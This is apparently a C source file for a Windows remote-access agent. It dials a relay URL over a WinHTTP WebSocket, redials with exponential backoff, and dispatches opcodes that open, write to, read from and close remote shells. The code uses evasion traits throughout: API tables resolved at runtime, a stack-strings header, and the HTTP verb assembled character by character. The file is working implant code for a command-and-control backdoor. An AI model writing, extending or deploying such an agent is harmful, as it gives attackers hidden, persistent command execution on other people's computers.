#include "winhttp_api.h"
#include "wintypes.h"
#include "memory.h"
#include "logger.h"
#include "kernel32.h"
#include "entry.h"
#include "stackstrings.h"
#include "commands.h"
#include "string.h"
#include "wire.h"
#include "random.h"


static BOOL HandleCommand(UINT8 opcode, PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context)
{
    switch ((CommandType)opcode)
    {
#if SUPPORT_SHELL
    case Command_OpenShell:
        Handle_OpenShellCommand(command, commandLength, response, responseLength, context);
        return TRUE;
    case Command_WriteShell:
        Handle_WriteShellCommand(command, commandLength, response, responseLength, context);
        return TRUE;
    case Command_ReadShell:
        Handle_ReadShellCommand(command, commandLength, response, responseLength, context);
        return TRUE;
    case Command_CloseShell:
        Handle_CloseShellCommand(command, commandLength, response, responseLength, context);
        return TRUE;
#endif
    default:
        return FALSE;
    }
}


static int run_session(Context *ctx, const WCHAR *url, int *long_lived, const CHAR *sessionKey);


INT32 agent_main(const WCHAR *url)
{
    KERNEL32 kernel;
    if (!KERNEL32_Ctor(&kernel)) {
        LOG_ERROR("Failed to resolve the kernel32 table");
        return RC_LOCAL_ERROR;
    }

    shell_slot shells[SHELL_POOL_SIZE];


    int backoff_delay = 1;
    Context ctx;

    MemoryZero(shells, sizeof(shells));
    ctx.shells  = shells;
    ctx.winhttp = NULL;

    Random random;
    CHAR sessionKey[37];
    if (!random.RandomUUID().ToString(sessionKey, sizeof(sessionKey))) {
        LOG_ERROR("Failed to generate the runtime session key");
        return RC_LOCAL_ERROR;
    }

    int rc = RC_SESSION_LOST;
    while (rc == RC_SESSION_LOST) {
        int long_lived = 0;
        rc = run_session(&ctx, url, &long_lived, sessionKey);

        if (rc == RC_SESSION_LOST) {
            int wait_s = backoff_delay;

            if (long_lived)
                backoff_delay = 1;
            else if (backoff_delay < 32)
                backoff_delay *= 2;

            LOG_INFO("Connection lost - redialing in %d s", wait_s);
            kernel.Sleep((DWORD)wait_s * 1000);
        }
    }
    return rc;
}

static int run_session(Context *ctx, const WCHAR *url, int *long_lived, const CHAR *sessionKey)
{
    int rc = RC_SESSION_LOST;
    BOOL https = FALSE;
    DWORD request_flags;
    USIZE headers_len = 0;

    HINTERNET session = NULL, connection = NULL, request = NULL, socket = NULL;

    KERNEL32 kernel32;
    if (!KERNEL32_Ctor(&kernel32)) {
        LOG_ERROR("Failed to resolve the kernel32 table");
        return RC_LOCAL_ERROR;
    }

    WINHTTP_API winhttp;
    if (!WINHTTP_API_Ctor(&winhttp)) {
        LOG_ERROR("Failed to resolve the WinHTTP table\n");
        return RC_LOCAL_ERROR;
    }

    ctx->winhttp = &winhttp;


    *long_lived = 0;

    URL_COMPONENTS uc;
    MemoryZero(&uc, sizeof(uc));
    uc.dwStructSize = sizeof(uc);

    WCHAR host[256];
    WCHAR path[2048];

    MemoryZero(host, sizeof(host));
    MemoryZero(path, sizeof(path));
    uc.lpszHostName    = host;  uc.dwHostNameLength = 256;
    uc.lpszUrlPath     = path;  uc.dwUrlPathLength  = 2048;

    if (!winhttp.WinHttpCrackUrl(url, 0, 0, &uc)) {
        LOG_ERROR("WinHttpCrackUrl failed (invalid URL)\n");
        rc = RC_LOCAL_ERROR;
        goto cleanup;
    }

    host[uc.dwHostNameLength] = L'\0';
    path[uc.dwUrlPathLength]  = L'\0';

    if (uc.nScheme != INTERNET_SCHEME_HTTP && uc.nScheme != INTERNET_SCHEME_HTTPS) {
        LOG_ERROR("Only http:// and https:// URLs are supported\n");
        rc = RC_LOCAL_ERROR;
        goto cleanup;
    }
    if (uc.dwHostNameLength == 0) {
        LOG_ERROR("URL has no host name\n");
        rc = RC_LOCAL_ERROR;
        goto cleanup;
    }
    https = (uc.nScheme == INTERNET_SCHEME_HTTPS);

    LOG_INFO("Connecting to relay %ls...", host);

    WCHAR ua_buf[18];
    BuildUserAgent(ua_buf);
    session = winhttp.WinHttpOpen(ua_buf, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!session) { LOG_ERROR("WinHttpOpen failed (GLE=%lu)", (unsigned long)kernel32.GetLastError()); goto cleanup; }

    connection = winhttp.WinHttpConnect(session, uc.lpszHostName, uc.nPort, 0);
    if (!connection) { LOG_ERROR("WinHttpConnect failed (GLE=%lu)", (unsigned long)kernel32.GetLastError()); goto cleanup; }

    request_flags = WINHTTP_FLAG_REFRESH;
    if (https) request_flags |= WINHTTP_FLAG_SECURE;

    WCHAR get_buf[4];
    get_buf[0] = L'G'; get_buf[1] = L'E'; get_buf[2] = L'T'; get_buf[3] = L'\0';
    request = winhttp.WinHttpOpenRequest(connection, get_buf, uc.lpszUrlPath, NULL, NULL, NULL, request_flags);
    if (!request) { LOG_ERROR("WinHttpOpenRequest failed (GLE=%lu)", (unsigned long)kernel32.GetLastError()); goto cleanup; }

    if (!winhttp.WinHttpSetOption(request, WINHTTP_OPTION_UPGRADE_TO_WEB_SOCKET, NULL, 0)) {
        LOG_ERROR("WinHttpSetOption UPGRADE_TO_WEB_SOCKET failed (GLE=%lu)", (unsigned long)kernel32.GetLastError());
        goto cleanup;
    }

    CHAR headers_a[IDENTITY_HEADERS_SIZE];
    headers_len = Handle_IdentityHeadersCommand(headers_a, sessionKey);
    if (headers_len == 0) {
        LOG_ERROR("identity header block does not fit\n");
        rc = RC_LOCAL_ERROR;
        goto cleanup;
    }
    WCHAR headers_w[IDENTITY_HEADERS_SIZE];
    if (AnsiToWide(headers_a, headers_w, IDENTITY_HEADERS_SIZE) < 0) {
        LOG_ERROR("identity header block conversion failed\n");
        rc = RC_LOCAL_ERROR;
        goto cleanup;
    }
    LOG_INFO("Identity headers prepared: %lu byte(s)", (unsigned long)headers_len);

    if (!winhttp.WinHttpSendRequest(request, headers_w,(DWORD)headers_len, NULL, 0, 0, 0)) {
        LOG_ERROR("WinHttpSendRequest failed (GLE=%lu)", (unsigned long)kernel32.GetLastError()); goto cleanup;
    }

    if (!winhttp.WinHttpReceiveResponse(request, NULL)) {
        LOG_ERROR("WinHttpReceiveResponse failed (GLE=%lu)", (unsigned long)kernel32.GetLastError()); goto cleanup;
    }

    socket = winhttp.WinHttpWebSocketCompleteUpgrade(request, 0);
    if (!socket) {
        LOG_ERROR("WinHttpWebSocketCompleteUpgrade failed (GLE=%lu)", (unsigned long)kernel32.GetLastError());
        goto cleanup;
    }
    winhttp.WinHttpCloseHandle(request);
    request = NULL;
    LOG_INFO("Connected (HTTP 101 Switching Protocols)");

    LOG_INFO("Agent mode: replying to commands (capability mask = Shell)");

    incoming_message msg;

    for (;;) {
        *long_lived = 1;
        BOOL closed = FALSE;

        DWORD err = WebSocketReceive(&winhttp, socket, &msg, &closed);
        if (err != NO_ERROR) {
            LOG_ERROR("WebSocketReceive failed err=%lu", (unsigned long)err);
            goto cleanup;
        }
        
        if (closed) {
            LOG_ERROR("Server closed the connection - redialing");
            goto cleanup;
        }

        unsigned char opcode = (msg.length > 0) ? msg.data[0] : 0xFF;
        unsigned int corr_id = (msg.length >= 5) ? ReadU32LE(msg.data, 1) : 0;

        if (msg.truncated) {
            err = SendErrorResponse(&winhttp, socket, corr_id);
            
            if (err == NO_ERROR) {
                LOG_ERROR("Message over max size - refused, status 1");
                continue;
            }
            LOG_ERROR("Failed to send WebSocket response err=%lu", (unsigned long)err);
            goto cleanup;
        }

        if (opcode == Command_Exit) {
            LOG_ERROR("Exit requested - terminating");
            rc = RC_EXIT;
            goto cleanup;
        }

        BOOL isValid = (opcode == Command_OpenShell && msg.length >= 5) || ((opcode < CommandTypeCount) && msg.length >= 13);
        unsigned char response_buffer[8 + SHELL_READ_CHUNK + 1];
        PCHAR response = (PCHAR)response_buffer;
        USIZE responseLength = 0;
        BOOL handled = FALSE;

        if (isValid)
            handled = HandleCommand(opcode, (PCHAR)msg.data, msg.length, &response, &responseLength, ctx);

        if (handled) {
            err = winhttp.WinHttpWebSocketSend(socket, WINHTTP_WEB_SOCKET_BINARY_MESSAGE_BUFFER_TYPE, (unsigned char *)response, (DWORD)responseLength);
        } 
        else {
            err = SendErrorResponse(&winhttp, socket, corr_id);
            if (err == NO_ERROR) {
                LOG_INFO("Command 0x%02x not implemented - replied status 1 (corr=%u)", opcode, corr_id);
            }
        }

        if (err != NO_ERROR) {
            LOG_ERROR("Failed to send WebSocket response err=%lu", (unsigned long)err);
            goto cleanup;
        }
    }

cleanup:
    if (socket)     winhttp.WinHttpCloseHandle(socket);
    if (request)    winhttp.WinHttpCloseHandle(request);
    if (connection) winhttp.WinHttpCloseHandle(connection);
    if (session)    winhttp.WinHttpCloseHandle(session);
    return rc;
}
